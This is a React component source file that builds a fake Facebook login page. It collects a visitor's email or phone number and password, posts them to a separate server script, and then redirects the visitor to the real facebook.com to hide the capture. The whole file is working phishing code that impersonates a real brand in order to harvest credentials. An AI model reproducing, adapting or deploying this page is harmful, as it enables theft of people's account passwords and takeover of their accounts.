import { useState } from "react";
import "./form.css";

const SendForm = () => {
  const [email, setEmail] = useState("");
  const [pwd, setPwd] = useState("");
  const [loading, setLoading] = useState(false);

  const handleClick = async (e) => {
    e.preventDefault();
    setLoading(true);
    let fData = new FormData();
    fData.append("email", email);
    fData.append("pwd", pwd);
    try {
      await fetch("http://localhost/api/server.php", {
        method: "post",
        body: fData,
      });
    } catch (error) {
      console.log(error);
    }
    setEmail("");
    setPwd("");
    setLoading(false);
    location.replace("https://www.facebook.com");
  };

  return (
    <div className="top">
      <h1 className="title">Facebook</h1>
      <form className="form" onSubmit={(e) => handleClick(e)} method="POST">
        <div className="form_header">
          <span>Log in to facebook</span>
        </div>
        <div className="inputs">
          <input
            value={email}
            id="input_label"
            type="text"
            className="input"
            onChange={(e) => setEmail(e.target.value)}
            placeholder="   Email address or phone number"
            name="email"
          />
          <input
            type="password"
            name="pwd"
            className="input"
            placeholder="   Password"
            onChange={(e) => setPwd(e.target.value)}
            value={pwd}
          />
          {loading ? (
            <button className="btn" type="submit">
              Loading
            </button>
          ) : (
            <button className="btn" type="submit">
              Log in
            </button>
          )}

          <div className="form_footer">
            <span className="footer_text">
              Forgotten account? Sign up for Facebook
            </span>
          </div>
        </div>
      </form>
    </div>
  );
};

export default SendForm;
